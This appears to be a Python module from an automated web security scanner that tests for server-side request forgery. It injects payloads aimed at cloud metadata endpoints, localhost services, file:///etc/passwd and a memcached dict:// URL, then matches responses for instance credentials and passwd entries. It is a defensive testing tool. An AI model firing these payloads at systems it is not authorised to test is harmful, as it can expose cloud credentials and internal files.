"""SSRF (Server-Side Request Forgery) check."""

from __future__ import annotations

import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import httpx

from .base import BaseCheck, FindingDraft

# Payloads targeting cloud metadata and internal services
_SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",  # AWS IMDS
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
    "http://169.254.169.254/metadata/v1/",  # Azure (older)
    "http://100.100.100.200/latest/meta-data/",  # Alibaba cloud
    "http://localhost:80/",
    "http://127.0.0.1:80/",
    "http://[::1]/",
    "http://0.0.0.0:80/",
    "http://localhost:8080/",
    "http://internal.example.com/",
    "file:///etc/passwd",
    "dict://localhost:11211/",
]

_AWS_RESPONSE_PATTERN = re.compile(
    r"ami-id|instance-id|local-ipv4|public-keys|security-credentials|IAM", re.I
)
_INTERNAL_PATTERNS = re.compile(
    r"root:x:|daemon:|bin/bash|Welcome to nginx|Apache|IIS|OpenSSH", re.I
)


class SSRFCheck(BaseCheck):
    name = "ssrf"
    description = "Test for SSRF via URL/path parameters"
    vuln_class = "SSRF"
    references = [
        "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/",
        "https://cwe.mitre.org/data/definitions/918.html",
        "https://portswigger.net/web-security/ssrf",
    ]
    applicable_categories = ["ssrf"]

    async def run(self, vector, client: httpx.AsyncClient, ai=None) -> list[FindingDraft]:
        findings: list[FindingDraft] = []
        url = vector.url
        params = vector.parameters

        if not params:
            return []

        # Filter to URL-like params
        url_params = [p for p in params if re.search(
            r"url|uri|path|src|source|dest|destination|target|proxy|fetch|load|import|callback|redirect",
            p, re.I
        )]
        if not url_params:
            url_params = params[:3]  # Try first 3 if none are obviously URL-like

        parsed = urlparse(url)

        for param in url_params:
            for payload in _SSRF_PAYLOADS[:6]:  # Test most impactful first
                qs = parse_qs(parsed.query)
                qs[param] = [payload]
                test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))

                try:
                    resp = await client.get(test_url, timeout=10)
                except Exception:
                    continue

                body = resp.text
                # Check for cloud metadata or internal service responses
                if resp.status_code == 200 and (
                    _AWS_RESPONSE_PATTERN.search(body) or
                    _INTERNAL_PATTERNS.search(body)
                ):
                    evidence = self._evidence_snippet(
                        f"GET {test_url}\nPayload: {payload}",
                        f"HTTP {resp.status_code}\n{body[:500]}",
                    )

                    severity = "critical"
                    if ai:
                        triage = ai.triage_finding(self.name, test_url, evidence)
                        if not triage.get("is_finding"):
                            continue
                        severity = triage.get("severity", "critical")

                    findings.append(FindingDraft(
                        title=f"SSRF via `{param}` at {parsed.netloc}{parsed.path}",
                        vuln_class=self.vuln_class,
                        severity=severity,
                        url=url,
                        parameter=param,
                        description=(
                            f"Parameter `{param}` accepted a server-side URL (`{payload}`) "
                            f"and returned internal service data."
                        ),
                        evidence=evidence,
                        references=self.references,
                    ))
                    break

        return findings
